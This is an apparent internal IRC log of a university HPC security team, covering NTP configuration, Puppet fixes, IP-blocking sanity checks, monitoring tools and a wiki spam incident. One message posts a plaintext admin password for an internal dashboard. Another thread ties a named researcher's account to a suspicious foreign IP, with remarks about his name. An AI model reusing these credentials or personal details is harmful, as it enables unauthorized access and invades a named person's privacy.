2015-01-09 15:23:15	jazoff	the username is gms5016
2015-01-09 15:23:56	jazoff	http://www.personal.psu.edu/users/g/m/gms5016/
2015-01-09 15:24:46	jazoff	if that's the same guy, i don't see any connections to RO
2015-01-09 15:25:16	soehlert	thatd be quite the coincidence on the username haha
2015-01-09 15:25:33	soehlert	his research does suggest he should be on BW but yah i dont see RO connections
2015-01-09 15:25:53	jazoff	yeah, also http://sc14.supercomputing.org/sites/all/themes/sc14/files/archive/src_poster/poster_files/spost122s2-file1.pdf
2015-01-09 15:27:55	jazoff	jazoff@h2ologin3:~> getent passwd gms5016
2015-01-09 15:27:56	jazoff	gms5016:*:48219:16496:George Slota:/u/sciteam/gms5016:/bin/bash
2015-01-09 15:28:11	soehlert	thats such a weird username. but ya theres the connection of name to username at least
2015-01-09 15:28:33	soehlert	could fire off an email to jeremy and see if he knows i guess
2015-01-09 15:30:32	jazoff	yeah, other than the name being somewhat ethnic i can't find anything
2015-01-09 15:30:40	jazoff	was hoping he went to college in RO
2015-01-09 15:31:38	soehlert	yup that's where im at too. shot an email to jenos to see if he can help or get us pointed in the right direction
2015-01-09 15:32:30	jazoff	in theory we can see what commands they ran through the bro logs right?
2015-01-09 15:33:19	jazoff	uhhhh
2015-01-09 15:33:36	jazoff	which appears to be broken
2015-01-09 15:34:18	jazoff	or at least, somethings up with the logs
2015-01-09 15:37:27	jschipp	last time we looked we couldn't find the commands
2015-01-09 15:37:40	jazoff	yeah, this thing is mostly incomprehensible
2015-01-09 15:38:17	jazoff	not sure if it's not workign right, or working right and just kidna uless
2015-01-09 15:38:19	jazoff	useless
2015-01-09 15:38:39	 *	jschipp flashes back to command logging e-mail
2015-01-09 15:38:57	jazoff	this is worrying:
2015-01-09 15:38:59	jazoff	alarm-mail.txt:   #167401 0 -1903328336:h2ologin3:22 1810635794 gms5016 @ 82.77.200.169 -> 0.0.0.0:22/tcp command: .bashr^?_history
2015-01-09 15:39:00	soehlert	its pretty much uesless
2015-01-09 15:39:51	jazoff	oh, though taht shows up a lot
2015-01-09 15:40:06	jazoff	[jazoff@derecho logs]$ wc -l alarm-mail.txt
2015-01-09 15:40:06	jazoff	708367 alarm-mail.txt
2015-01-09 15:40:11	jazoff	yeahh, something is not workign right :)
2015-01-09 15:40:28	jazoff	goes back a few weeks, should be emailed or rotated once a day
2015-01-09 15:43:29	soehlert	ya that whole thing is a mess at best
2015-01-09 15:43:54	soehlert	and it should be better on the new box, but i have to puppetize the bastions still to make that work and that's gonna take a while
2015-01-12 08:24:49	jazoff	so, just realized that the clock on fog is 7 minutes fast
2015-01-12 08:25:11	jazoff	jazoff@air  ~  $ date;ssh fog date
2015-01-12 08:25:12	jazoff	Mon Jan 12 09:25:05 EST 2015
2015-01-12 08:25:12	jazoff	Mon Jan 12 08:32:00 CST 2015
2015-01-12 08:42:31	eyrich	is it not running ntpd?
2015-01-12 08:42:46	jazoff	well it's a VM
2015-01-12 08:42:56	eyrich	dew and fog are physcial
2015-01-12 08:43:21	jazoff	nope... fog is vmware
2015-01-12 08:43:40	eyrich	oh right - on the non-production esx
2015-01-12 08:43:47	eyrich	let me investigate
2015-01-12 08:46:29	eyrich	hail has the right time, and fog's settings say sync time
2015-01-12 08:59:29	soehlert	the plumbers are coming today to replace the broken pipes and give me a kitchen again. i'll be working from home
2015-01-12 12:35:39	soehlert	jschipp: just thought about this. any way to do a nagios alert for clock skew?
2015-01-12 12:37:42	jazoff	would be doable, but you'd basically just be writing soething like ntp :)
2015-01-12 12:38:13	jazoff	basically if you had a simple web service that exported the current date, you would hit that and then compare to the current date and alert if more than a few seconds
2015-01-12 12:39:32	jazoff	heh actually, that's what the old time protocol was for that used to run on port 37
2015-01-12 12:42:20	soehlert	ahh ok. i was hoping there might be an easier way to just run date on the server every once in a while and compare to date on nagios-sec or something
2015-01-12 12:43:53	jazoff	not sure if you can do that with nrpe, but if you can i guess it would be easy enough
2015-01-12 13:10:00	jazoff	one way that would definitely work is enable timed inside inetd and use that for the check
2015-01-12 13:10:10	jazoff	(i don't think you can run something like ntpdate while ntp is running)
2015-01-12 13:17:10	soehlert	i believe you are correct on that
2015-01-12 13:17:53	jazoff	ah, this kinda works: ntpdate  -d -u ntp
2015-01-12 13:18:16	jazoff	for fog it prints 12 Jan 13:24:34 ntpdate[21885]: step time server 141.142.2.2 offset -416.236779 sec
2015-01-12 13:29:47	jschipp	there's a few ntp plugins that come with standard plugins, I'll have a look at them
2015-01-12 13:30:48	soehlert	http://engineeringblog.yelp.com/2015/01/osxcollector-forensic-collection-and-automated-analysis-for-os-x.html
2015-01-12 14:03:50	eyrich	any thing to report on the IRST call
2015-01-12 14:05:38	jazoff	any update on the romanian guy?
2015-01-12 14:07:15	jazoff	probably not what you were thinking of :)
2015-01-12 14:12:35	wraquel	eyrich: nope
2015-01-12 14:13:58	wraquel	eyrich: http://notepad-plus-plus.org/
2015-01-12 14:14:02	soehlert	jazoff: nope on the update
2015-01-12 14:20:19	eyrich	wraquel: do you owe greg at Purdue an email?
2015-01-12 14:21:38	wraquel	forrrr
2015-01-12 14:22:46	wraquel	?
2015-01-12 14:23:26	wraquel	Last email I got from greg is Nov 2014.
2015-01-12 14:43:22	soehlert	eyrich: i'm working on polos. can you open a hole in the fw from fog/dew/cerberus to 141.142.149.[19-21]
2015-01-12 15:11:17	soehlert	hey jazoff have you seen this? i obviously don't know, but might it be useful in some of the places you're using csv's? http://dataset.readthedocs.org/en/latest/
2015-01-12 15:11:30	jazoff	yeah
2015-01-12 15:11:42	jazoff	i've been meaning to write something similar
2015-01-12 15:11:50	jazoff	but something that exposes a redis-like api
2015-01-12 15:12:11	jazoff	since often a k/v store is more useful than a table for keeping track of things in scripts
2015-01-12 15:13:22	jazoff	like try.bro uses redis, and most of the reasoning is things like ttl expiration is a standard feature
2015-01-12 15:13:44	jazoff	so rather than have to make a table with key/value/ttl and have a cron job that clears out old entries, you just set a k/v with a ttl and redis does the rest
2015-01-12 15:23:18	jazoff	http://samy.pl/keysweeper/
2015-01-12 15:40:54	soehlert	interesting. im not familiar with redis at all
2015-01-12 15:55:59	jazoff	bbs, have to pick up dog from vet
2015-01-12 16:02:47	jschipp	is zephyr no more?
2015-01-12 16:03:01	jschipp	and splunkmaster
2015-01-12 16:04:46	soehlert	wraquel: we shut down zephyr yes?
2015-01-12 16:05:40	soehlert	splunkmaster is gone
2015-01-12 16:05:54	soehlert	as are splunki-[1/2] and splunks-sec
2015-01-12 16:05:59	soehlert	just splunk-sec left
2015-01-12 16:20:28	jschipp	kk, thanks
2015-01-12 16:39:20	jazoff	back
2015-01-12 16:56:44	jazoff	wooo
2015-01-12 16:56:50	jazoff	splunk support request submitted
2015-01-12 16:56:55	jazoff	(now that I have support access)
2015-01-12 16:57:17	jazoff	hopefully get this stupid addon issue resolved and get moving on getting off cyclone
2015-01-12 19:44:16	wraquel	soehlert: I think so
2015-01-12 19:44:33	wraquel	That was the old grid-sec or xsede wiki server, can't remember.
2015-01-12 19:45:01	wraquel	maybe snow was xsede and zephyr grid-sec?
2015-01-13 09:17:50	soehlert	wraquel: i think that was right
2015-01-13 09:17:50	soehlert	plumbers are finishing up this morning. shoould be in after lunch
2015-01-13 09:20:36	wraquel	Regarding kitchen plumbing, if you ever get a new garbage disposal and have a dishwasher connected to it, don't forget to remove the plug for the disposal inlet, otherwise, water just pools up in your dishwasher.
2015-01-13 09:21:19	soehlert	indeed it does
2015-01-13 09:21:40	soehlert	which does not help keep things clean
2015-01-13 09:21:54	wraquel	And a heating coil under dirty dishwater doesn't smell good.
2015-01-13 09:22:40	soehlert	oof no
2015-01-13 09:23:58	wraquel	Fortunately we noticed it before it overflowed.
2015-01-13 09:24:53	wraquel	I also forgot to tighten the neck of the disposal before doing a water test. The water basically just flowed into the cabinet.
2015-01-13 09:25:04	wraquel	clean water at least.
2015-01-13 09:25:15	soehlert	well theres that
2015-01-13 09:26:04	soehlert	thats how i first noticed we had an issue. water flowing out of hte cabinet is never what you expect to see
2015-01-13 09:26:15	wraquel	nope
2015-01-13 10:01:07	jschipp	hmmm,  there 3 inches of water pooled up in the bottom of my dishwasher and it took about 2 hours to run after I pressed start. I thought it was odd but I wasn't sure, maybe I need to get mine checked. Dished didn't come out clean for sure
2015-01-13 10:03:14	wraquel	so someone reported a lost RSA hardtoken. We should probably add a check for detecting the use of lost tokens in splunk.
2015-01-13 10:03:24	wraquel	or sec or whatever seems best.
2015-01-13 10:07:35	jazoff	how would that show up?
2015-01-13 10:22:10	wraquel	what's the cuckoo link?
2015-01-13 10:22:38	jazoff	http://cuckoo-sec.ncsa.illinois.edu/
2015-01-13 10:23:11	wraquel	ERROR :-(
2015-01-13 10:23:12	wraquel	Error adding task to Cuckoo's database.
2015-01-13 10:23:37	jazoff	I didn't break it this time :)
2015-01-13 11:03:00	jschipp	I changed quite a few things, don't use it atm
2015-01-13 11:08:16	jschipp	putting it on a for a bit too until I catch up on other projects
2015-01-13 11:39:23	wraquel	oops
2015-01-13 11:39:24	wraquel	heh
2015-01-13 13:25:02	wraquel	eyrich: soehlert did you guys look at that Windows 7 system for iForge?
2015-01-13 13:35:09	eyrich	wraquel: im not sure where that is, last time i rememeber Sam was waiting for access
2015-01-13 13:36:31	soehlert	wraquel: do you know where that ticket is? trying to find it
2015-01-13 13:37:31	soehlert	nevermind found it. still waiting on jim's response
2015-01-13 13:37:59	wraquel	Ok, Evan was asking about it today and I didn't know. 
2015-01-13 13:38:13	wraquel	Add a ping on that ticket
2015-01-13 13:38:27	soehlert	i just did
2015-01-13 13:38:31	wraquel	cool
2015-01-13 13:38:33	soehlert	cc'ed jim too just to be sure
2015-01-13 13:38:42	wraquel	thnx
2015-01-13 13:40:11	eyrich	Sam can you make this change on the proxy?
2015-01-13 13:40:13	eyrich	https://jira.ncsa.illinois.edu/browse/BWCC-704
2015-01-13 13:40:22	eyrich	dont do by IP though
2015-01-13 13:40:33	eyrich	i mean soehlert
2015-01-13 13:40:54	soehlert	so add hpss01.ncsa.illinois.edu?
2015-01-13 13:41:00	eyrich	yes
2015-01-13 13:41:08	soehlert	and what is the list for in the ticket? is he just listing what we already allow?
2015-01-13 13:41:14	eyrich	i think that will take care of it
2015-01-13 13:41:35	eyrich	no - hes listing all the stuff the repo for
2015-01-13 13:41:51	soehlert	oooo i see
2015-01-13 13:46:07	soehlert	done
2015-01-13 14:19:50	jschipp	Thruk WUI is fixed now for anyone who wants to use it, also Chrome prompts twice while Firefox does not 
2015-01-13 14:20:41	jazoff	is the realm different?
2015-01-13 14:23:49	jschipp	nope
2015-01-13 14:23:54	jschipp	NCSA.EDUi
2015-01-13 14:24:02	jschipp	no i
2015-01-13 14:46:01	jschipp	heading to the CIF meeting with CITES in a few minutes
2015-01-13 14:46:17	jazoff	:)
2015-01-13 14:46:30	jazoff	I think tomorrow I will try to bang out the bhr/cif integration 
2015-01-13 14:46:40	jazoff	(the threshold/duration stuff)
2015-01-13 14:59:49	jschipp	sounds good :)
2015-01-14 09:41:36	eyrich	soehlert: let me know when you are in. Have some info from BW CC meeting
2015-01-14 09:46:30	wraquel	This looks cool https://code.google.com/p/malware-crawler/
2015-01-14 10:39:39	jazoff	cool, implemented country code based scaling on the bro bhr code
2015-01-14 10:40:01	jazoff	intel based should be easy too.. doing the different thresholds is a little trickier though
2015-01-14 10:40:43	jazoff	unforunately it's the new bhr system so the current one that actually null routes things isn't donig it
2015-01-14 12:13:18	jazoff	soehlert: just noticed that new puppet module you added..
2015-01-14 12:13:25	soehlert	which one?
2015-01-14 12:13:52	jazoff	the remi one
2015-01-14 12:13:56	soehlert	and?
2015-01-14 12:14:12	jazoff	i think you need provider    => "shell",
2015-01-14 12:14:18	soehlert	whys that?
2015-01-14 12:14:20	jazoff	in order for shell stuff to work inside of an exec
2015-01-14 12:14:25	soehlert	it works as it
2015-01-14 12:14:27	soehlert	is*
2015-01-14 12:14:38	jazoff	oh? i wonder if the default changed when we upgraded it a while back
2015-01-14 12:14:47	soehlert	possibly. i copied how we did the epel one
2015-01-14 12:15:56	jazoff	ah :)
2015-01-14 12:25:22	eyrich	why are there 4 polos?
2015-01-14 12:25:25	eyrich	a,b,c,t
2015-01-14 12:35:14	soehlert	t is rhel still
2015-01-14 12:35:17	soehlert	c is replacing it
2015-01-14 13:06:22	jazoff	ah, I thought it was polot :)
2015-01-14 14:34:50	wraquel	jazoff: do you have an RDP client?
2015-01-14 14:35:57	wraquel	Need you to log into NCSA-TRENZALORE.AD.UILLINOIS.EDU using the account 'su-jazoff'. The password is in LastPass. You'll have to change your password after logging in.
2015-01-14 14:36:51	wraquel	Campus AD password rules are minimum of 8 chars, uppercase, lowercase, number and special char must be in it
2015-01-14 14:37:12	wraquel	This is so CITES Security can give you access to something. I"m guessing maybe a duo server or something in AD.
2015-01-14 14:38:55	jazoff	ok
2015-01-14 14:40:55	wraquel	After you log in, feel free to disconnect. It's just to reset your pw.
2015-01-14 14:41:07	wraquel	You can delete the shared pw in lastpass too if you want.
2015-01-14 14:42:46	jazoff	gotcha
2015-01-14 14:45:32	jazoff	-L 3389:141.142.23.16:3389
2015-01-14 14:45:36	jazoff	grrr stupid ssh
2015-01-14 14:50:37	jazoff	grrri can't paste
2015-01-14 14:51:55	wraquel	Hmm. I can copy and paste. I just have to remember which key windows thinks is ctrl.
2015-01-14 14:52:04	jazoff	ah
2015-01-14 14:55:48	jazoff	ok, pw changed
2015-01-14 14:56:19	wraquel	prost!
2015-01-14 15:50:17	wraquel	MLK Monday. It's a holiday. Don't show up here.
2015-01-14 15:51:01	jazoff	ok :)
2015-01-14 15:51:21	jazoff	So, it's still a little messed up due to docker issues, but check out http://brototype.ncsa.illinois.edu:9000/#/dashboard/db/bro
2015-01-14 15:51:42	wraquel	which password?
2015-01-14 15:51:54	jazoff	creds are admin:wzm1uJZrPqRI
2015-01-14 15:52:36	wraquel	soooo... You wanna get a cert for that? It's free.
2015-01-14 15:53:03	jazoff	oh, maybe.. still kinda kicking the tires
2015-01-14 15:53:03	wraquel	I wonder if bro threw a notice about clear http auth
2015-01-14 15:53:08	wraquel	STill free.
2015-01-14 15:53:24	jazoff	yeah.. i'm not sure how to make it use ssl, i'd probably have to rebuild the container
2015-01-14 15:54:02	jazoff	so, you can pretty much do all the same things in splunk, but this is potentially faster once you have lots of data and graphs
2015-01-14 15:54:28	jazoff	so, trying to compare the two and see if this is worth using or if logging metrics to splunk and graphing them there works just as well
2015-01-14 15:56:54	jazoff	the one nice thing about grafana/influxdb (or even graphite) is that it is free so potentially more work can be shared with other people
2015-01-14 16:27:40	jschipp	and collectd is dope for system stats
2015-01-14 16:27:57	jschipp	easy integration
2015-01-14 16:29:13	jazoff	yeah.. The munin thing I setup is good, but it is kinda limited so I would not mind migrating
2015-01-14 16:29:31	jazoff	munin was more of a 'i can get this setup in a day and it will pretty much just work'
2015-01-14 16:30:29	jazoff	(and there are munin -> graphite/influxdb tools as well, though I think collectd is more efficient)
2015-01-14 16:30:39	jazoff	also came across https://github.com/BrightcoveOS/Diamond
2015-01-14 16:31:05	jazoff	er https://github.com/python-diamond/Diamond
2015-01-14 16:31:34	jazoff	it supports a crazy amount of collectors https://github.com/python-diamond/Diamond/wiki/Collectors
2015-01-14 16:53:52	jschipp	looks good too
2015-01-14 16:55:48	jazoff	yeah, like one thing I realized would be nice to have is how long a BHR request takes
2015-01-14 16:56:14	jazoff	now I could log that to syslog and then graph it to splunk, but it's even easier with statsd/grafana
2015-01-14 16:56:21	jazoff	but in the meantime I think I will go the syslog route
2015-01-15 03:23:15	soehlert	still feeling pretty awful, wont make it in tomorrow
2015-01-15 09:04:28	eyrich	LOTS of vm guests have no time sync, is this one purpose or are people forgetting to set it?
2015-01-15 09:26:19	jazoff	I think we did that on purpose
2015-01-15 09:26:25	jazoff	weren't we not supposed to run ntp on vms?
2015-01-15 09:26:41	eyrich	i mean the vmware time sync is not enabled
2015-01-15 09:26:48	jazoff	oh, dunno what that is
2015-01-15 09:27:15	eyrich	thats what keeps the virtual RTC of the machine in sync with the ESX host's rtc
2015-01-15 09:27:48	eyrich	yes in gerneral you dont want ntpd trying to figure out the slew of your rtc on a vm
2015-01-15 09:28:21	eyrich	time sync its a check mark in the settings of the guest on the vshphere client
2015-01-15 09:31:01	jazoff	ah
2015-01-15 09:31:24	jazoff	does vsphere have VM templates? seems like something like that would prevent some of these issues
2015-01-15 09:32:29	eyrich	yes a template can be made
2015-01-15 09:34:30	eyrich	i created one for centos
2015-01-15 10:01:10	eyrich	so does anyone object to me setting sync time and all the current VMs?
2015-01-15 10:06:28	jazoff	not I
2015-01-15 10:09:29	jschipp	my understanding was vmware's recommendation was to use ntpd
2015-01-15 10:09:37	jschipp	but I don't care that much
2015-01-15 10:10:17	eyrich	that is contrary to my previous info
2015-01-15 10:10:26	eyrich	do you have documentation?
2015-01-15 10:11:29	eyrich	ok I found some updated stuff
2015-01-15 10:11:37	eyrich	http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&cmd=displayKC&externalId=1006427
2015-01-15 10:11:43	eyrich	you are right Jon,
2015-01-15 10:12:29	eyrich	need to update the config in puppet
2015-01-15 10:12:31	eyrich	to VMs
2015-01-15 10:13:08	jschipp	kk, I was looking for that link, glad you found it
2015-01-15 10:13:30	jazoff	so, right now we specifically disable ntp on vms
2015-01-15 10:13:37	jazoff	should we just treat vms like physical hosts?
2015-01-15 10:13:37	eyrich	i recommend we point to: ntp.ncsa.illinois.edu and 0.us.pool.ntp.org through 3.us.pool.ntp.org
2015-01-15 10:13:39	eyrich	right
2015-01-15 10:13:43	eyrich	looks like it
2015-01-15 10:13:51	jazoff	ok, that's a simple change in puppet
2015-01-15 10:14:06	jschipp	then we don't ever have to worry about this again, yay :)
2015-01-15 10:14:19	eyrich	warm/cool/tepid might be special, - they have to serve time to the HSMs
2015-01-15 10:14:23	eyrich	right
2015-01-15 10:14:39	jazoff	oh, i think we have that
2015-01-15 10:14:45	jazoff	theres a ntp:ca class
2015-01-15 10:14:51	jazoff	# This module sets up CA machines to use local time
2015-01-15 10:14:51	jazoff	# which is needed for HSMs
2015-01-15 10:14:57	jazoff	so we have that covered
2015-01-15 10:14:57	eyrich	it will need to be updated to enable syning to ourside pper
2015-01-15 10:15:05	eyrich	to outside peers
2015-01-15 10:15:12	eyrich	right now I think it only trusts its rtc
2015-01-15 10:15:48	jazoff	I updated the ntp module in development to map the 'vm' ntp type back to standard
2015-01-15 10:16:01	jazoff	so in ~15 minutes most of the vms should fix themselves
2015-01-15 10:16:06	jazoff	see how that goes and then move it to production
2015-01-15 10:16:09	jschipp	sweet, thanks
2015-01-15 10:16:50	eyrich	we might want to still have special - per the docs: The configuration directivetinker panic 0instructs NTP to not give up if it sees a large jump in time. This is important for coping with large time drifts and also resuming virtual machines from their suspended state.
2015-01-15 10:17:43	eyrich	t is also important to not use the local clock as a time source, often referred to as the Undisciplined Local Clock. NTP has a tendency to fall back to this in preference to the remote servers when there is a large amount of time drift.
2015-01-15 10:17:44	eyrich	An example of such a configuration is:
2015-01-15 10:17:44	eyrich	server 127.127.1.0
2015-01-15 10:17:44	eyrich	fudge 127.127.1.0 stratum 10
2015-01-15 10:17:44	eyrich	Comment out both lines to stop this behavior.
2015-01-15 10:17:44	eyrich	After making changes to the NTP configuration, the NTP daemon must be restarted. For more information, refer to your operating system vendor's documentation.
2015-01-15 10:18:18	jazoff	ah
2015-01-15 10:24:08	eyrich	ok so should I go uncheck time sync from all the linux machines?
2015-01-15 10:24:30	jazoff	well i only made the change in the dev environment
2015-01-15 10:25:29	eyrich	ok, it can wait until we are sure it is all working
2015-01-15 10:25:36	eyrich	and pushed out everywhere
2015-01-15 10:34:49	eyrich	funny in their longer timekeeping vms document they talk about how advanced and awesome the vmware tools time sync is, they say but go ahead and use ntp
2015-01-15 10:34:54	eyrich	then say..
2015-01-15 10:35:08	jazoff	odd
2015-01-15 10:35:08	eyrich	the biggest thing is dont try to use boith
2015-01-15 10:35:10	eyrich	both
2015-01-15 11:38:17	jazoff	hmm, puppet change does not appear to be being pushed out. odd
2015-01-15 11:45:14	jazoff	ah, i think the ntp module is just not starting ntp
2015-01-15 11:48:37	jazoff	that's better
2015-01-15 11:53:56	jazoff	figured out that the service definition was just in the wrong place, moved it to ntp::common and that fixed it
2015-01-15 13:12:38	eyrich	which machine does that appy to? I would like to take a look
2015-01-15 13:12:55	jazoff	i was looking at portal-sec
2015-01-15 13:13:04	jazoff	it has ntp running now
2015-01-15 13:14:28	eyrich	shouldnt I be able to ksu on fog and ssh to portal-sec?
2015-01-15 13:14:35	jazoff	kinit, yeah
2015-01-15 13:14:43	eyrich	right
2015-01-15 13:15:03	eyrich	i forget shit over break :)
2015-01-15 13:16:16	eyrich	the ntp.conf isnt using ntp.ncsa first
2015-01-15 13:16:25	eyrich	or at all
2015-01-15 13:16:46	jazoff	hmm
2015-01-15 13:17:56	eyrich	also for a vm we want the tinker panic 0 directive
2015-01-15 13:18:30	jazoff	odd
2015-01-15 13:18:31	jazoff	common.yaml:ntp::server: '141.142.2.2'
2015-01-15 13:18:55	jazoff	oh, i think that's the wrong variable
2015-01-15 13:19:27	jazoff	ntp::standard::server: '141.142.2.2'
2015-01-15 13:19:28	jazoff	should do it
2015-01-15 13:21:06	eyrich	i would suggest these as the servers directives
2015-01-15 13:21:07	eyrich	server ntp.ncsa.illinois.edu iburst
2015-01-15 13:21:07	eyrich	server 0.us.pool.ntp.org
2015-01-15 13:21:07	eyrich	server 1.us.pool.ntp.org
2015-01-15 13:21:07	eyrich	server 2.us.pool.ntp.org
2015-01-15 13:21:07	eyrich	server 3.us.pool.ntp.org
2015-01-15 13:39:32	jazoff	well, that last change fixed the first server
2015-01-15 13:39:38	jazoff	has server 141.142.2.2 now
2015-01-15 13:39:54	eyrich	yes
2015-01-15 13:39:58	jazoff	Not sure if soehlert used the ip for a reason
2015-01-15 13:40:13	jazoff	dns outage should be rare, and the clock shouldn't get that out of sync before dns comes back
2015-01-15 13:40:14	eyrich	i disabled the vmtools time sync for portal-sec
2015-01-15 13:40:22	jazoff	so I think we could use the hostname safely
2015-01-15 13:40:27	eyrich	i was thinking of that too
2015-01-15 13:40:30	eyrich	agreed
2015-01-15 13:40:44	eyrich	and i also suggest using generic pool entries instead of rhel.
2015-01-15 13:40:46	jazoff	yeah
2015-01-15 13:41:07	eyrich	and iburst can be used with our local server for quicker sync - but not nice for foreign servers
2015-01-15 13:41:51	jazoff	ok, changed
2015-01-15 13:41:56	jazoff	should sync up soon
2015-01-15 13:42:01	eyrich	cool
2015-01-15 13:46:15	jazoff	server ntp.ncsa.illinois.edu iburst
2015-01-15 13:46:16	jazoff	server 0.us.pool.ntp.org
2015-01-15 13:46:16	jazoff	etc
2015-01-15 13:46:24	jazoff	all dev boxes should have that shortly
2015-01-15 13:46:41	eyrich	physical and vm?
2015-01-15 13:46:57	jazoff	yeah
2015-01-15 13:47:29	eyrich	ok only for vms we want the local clock stuff commented out, and the tinker 0 directive
2015-01-15 13:48:41	jazoff	hmmm
2015-01-15 13:50:06	eyrich	hmm - you are thinking how to do it or if I am right?
2015-01-15 13:51:31	jazoff	thinking yeah
2015-01-15 13:51:34	jazoff	i can get it done
2015-01-15 13:51:40	eyrich	cool
2015-01-15 13:53:43	eyrich	time to let the dogs out, IM me if you need anything
2015-01-15 13:54:51	jazoff	grrr fucking vmware ' Temporary Maintenance - Knowledge Base '
2015-01-15 14:00:08	jazoff	heh, that is the example in the puppet docs
2015-01-15 14:03:42	jazoff	done
2015-01-15 16:30:44	jschipp	ls
2015-01-16 09:31:38	jazoff	sigh, comcast is driving me nuts today. apparently my internet connection wants to stop working for 30 seconds every 2 minutes
2015-01-16 09:55:16	wraquel	whee
2015-01-16 10:00:44	jazoff	more like weeeeeeeeee.....eeeeeeeeeee....eeeeeeeeeee
2015-01-16 10:02:00	wraquel	so, looks like we should add some sanity checking for any blocks we implement from CIF.
2015-01-16 10:03:13	jazoff	indeed
2015-01-16 10:03:39	jazoff	it supports cidr blocks, but doesn't check for a maximum network size
2015-01-16 10:04:09	jazoff	you couldn't block 0.0.0.0/0 since that would overlap any whitelisted subnet, but blocking a /8 would work
2015-01-16 10:08:09	jazoff	power cycled the modem, seems to have helped.  got a completely different ip
2015-01-16 10:50:19	jazoff	so, looks like postgres would have rejected that ip anyway
2015-01-16 10:50:30	jazoff	'Value has bits set to right of mask.'
2015-01-16 10:51:42	jazoff	well, done
2015-01-16 10:51:51	jazoff	        "Prefix length in 199.2.3.101/8 is too small"
2015-01-16 10:52:07	jazoff	based on     'minimum_prefixlen': 23,
2015-01-16 11:22:36	jazoff	so.. this power outage isn't going to affect our rack is it?
2015-01-16 11:51:20	eyrich	jazoff: not expected too
2015-01-16 12:10:28	eyrich	power is back
2015-01-16 13:25:02	wraquel	jazoff: bro logs on seclogs, they're accessible by root only, any chance we could change that?
2015-01-16 13:25:21	eyrich	no bro for you
2015-01-16 13:26:19	jazoff	on seclogs?
2015-01-16 13:26:49	wraquel	yep.
2015-01-16 13:26:54	wraquel	just on seclogs.
2015-01-16 13:27:03	jazoff	what path are you looking at?
2015-01-16 13:27:09	wraquel	alex needs access to view them. Didn't think he really need root access for it.
2015-01-16 13:27:14	wraquel	/usr/local/logs
2015-01-16 13:27:38	jazoff	oh, that's just syslog
2015-01-16 13:28:29	jazoff	oh, the perms are fine.. he's probably looking in one of the dirs that needs to be deleted
2015-01-16 13:28:52	jazoff	/usr/local/logs/archive/seclogs/2014/01/01
2015-01-16 13:29:12	wraquel	/usr/local/logs/2015... oh archives....
2015-01-16 13:29:27	wraquel	although 2015 isn't there.
2015-01-16 13:29:43	jazoff	it is
2015-01-16 13:29:43	wraquel	nope, can't even access archive/2014
2015-01-16 13:29:53	jazoff	the seclogs one
2015-01-16 13:30:21	wraquel	[wraquel@seclogs archive]$ cd 2014/
2015-01-16 13:30:22	wraquel	-bash: cd: 2014/: Permission denied
2015-01-16 13:30:31	wraquel	[wraquel@seclogs archive]$ pwd
2015-01-16 13:30:32	wraquel	/usr/local/logs/archive
2015-01-16 13:30:55	jazoff	/usr/local/logs/archive/seclogs/2014/01/01
2015-01-16 13:31:11	wraquel	need bro logs
2015-01-16 13:31:21	wraquel	are they on seclogs?
2015-01-16 13:31:47	jazoff	no.. /data/syslogs is mounted
2015-01-16 13:31:52	jazoff	bro logs are in /data/bro on lowp
2015-01-16 13:32:23	jazoff	not that we couldn't mount /data/bro on seclogs
2015-01-16 13:32:24	jazoff	it just isn't currently
2015-01-16 13:34:41	wraquel	perfect. thanks.
2015-01-16 13:35:31	jazoff	hmm
2015-01-16 13:35:50	jazoff	puppet is setup a little weird.. i can mount it manually for now but that needs to be worked out
2015-01-16 13:36:55	wraquel	you mean mounting bro on seclogs?
2015-01-16 13:37:06	wraquel	Not sure if that's needed as long as it's on lowp.
2015-01-16 13:37:13	jazoff	yeah
2015-01-16 13:37:17	jazoff	oh, ok then
2015-01-16 13:37:38	jazoff	yeah, it's in /data/bro
2015-01-16 13:37:42	wraquel	I thought seclogs replaced lowp. Maybe I'm thiking thunder...
2015-01-16 13:39:07	jazoff	i think so too
2015-01-16 13:49:00	jazoff	soo, nothing to do then?
2015-01-16 14:09:14	eyrich	im out
2015-01-16 14:34:49	wraquel	nope, nuttin to do
2015-01-20 07:43:34	jazoff	hmm
2015-01-20 07:43:38	jazoff	Message: <apache@ncsa.illinois.edu> has sent mail to more than 102 recipients in 2.0 hrs
2015-01-20 07:43:41	jazoff	that probably not good
2015-01-20 07:44:14	jazoff	from the 'Earthcube Geosemantics Semantic Media Wiki' apparently
2015-01-20 07:53:25	jazoff	ah, the subject is 'Earthcube Geosemantics Semantic Media Wiki email address confirmation'
2015-01-20 07:57:30	jazoff	so it looks like someone spammed the sign up form to annoy some people
2015-01-20 07:57:39	jazoff	the to addresses are all like
2015-01-20 07:57:40	jazoff	<"lis.aynh.i.kc.k..snce.n"@gmail.com>
2015-01-20 07:57:40	jazoff	<"l.is.a.ynhik.c.k..snce.n"@gmail.com>
2015-01-20 07:58:31	jazoff	and a google search for lisaynhikcksncen@gmail.com finds various forum spam related posts
2015-01-20 07:58:54	jazoff	so i guess they aren't trying to annoy that person with confirmation emails, they are just trying to register 
2015-01-20 09:56:22	wraquel	fun
2015-01-20 10:33:47	jazoff	well, that seems to have stopped on its own
2015-01-20 11:00:15	jschipp	lol
2015-01-20 11:55:53	wraquel	jazoff: status on CA and Duo interfaces?
2015-01-20 11:56:07	wraquel	And if you heard back about the Splunk Bro issue?
2015-01-20 11:56:52	jazoff	splunk wrote me back asking for more info, I replied, haven't heard back
2015-01-20 11:57:05	jazoff	haven't heard anything more on DUO since the last time it came up..
2015-01-20 11:57:24	jazoff	the CA thing I need to get started on now that the new BHR system is pretty much done
2015-01-20 11:57:36	jazoff	or at least done enough that additional tweaks are easy enough to add
2015-01-20 11:58:34	jazoff	i read through the requirements for the CA stuff a few times, it seems mostly straightforward
2015-01-20 11:58:58	jazoff	it's kind of two parts.. one part is working out the apis for requesting certs, the rest is just all the access control stuff
2015-01-20 12:08:14	jazoff	so, what was teh deal with https://github.com/edthedev/incommon_ssl/tree/master/comodo ?
2015-01-20 12:10:43	wraquel	jazoff: I'm guessing they only got a few hours of ed's time to write a python interace and that's as far as he got.
2015-01-20 12:10:54	jazoff	ah
2015-01-20 12:11:01	jazoff	seems like an ok start
2015-01-20 12:15:12	jazoff	unfortunate that incommon uses soap, but not much can be done about that
2015-01-20 12:24:04	jazoff	ah, so the incommon api is the same as the comodo api
2015-01-20 12:25:34	jazoff	I see how to implement most of the use cases, one potential issue is the api does not seem to have a 'list certificates' method
2015-01-20 12:26:10	jazoff	so the service could keep track renewal dates for certs that it requested, but there doesn't seem to be a way to discover older certs that might be expiring
